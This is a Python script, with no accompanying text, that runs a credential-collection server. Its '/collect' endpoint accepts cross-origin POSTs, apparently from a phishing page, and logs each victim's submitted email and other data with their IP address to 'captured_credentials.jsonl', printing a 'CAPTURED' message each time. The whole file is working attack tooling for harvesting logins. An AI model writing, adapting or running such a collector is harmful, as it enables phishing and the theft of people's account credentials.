#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            data = json.loads(body.decode())
            entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'ip': self.client_address[0],
                **data
            }
            with open('captured_credentials.jsonl', 'a') as f:
                f.write(json.dumps(entry) + '\n')
            print(f"[+] CAPTURED: {data.get('email','?')} from {self.client_address[0]}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    def log_message(self, format, *args):
        pass

server = HTTPServer(('0.0.0.0', 8080), Handler)
print(f"[*] Collector on port 8080")
server.serve_forever()
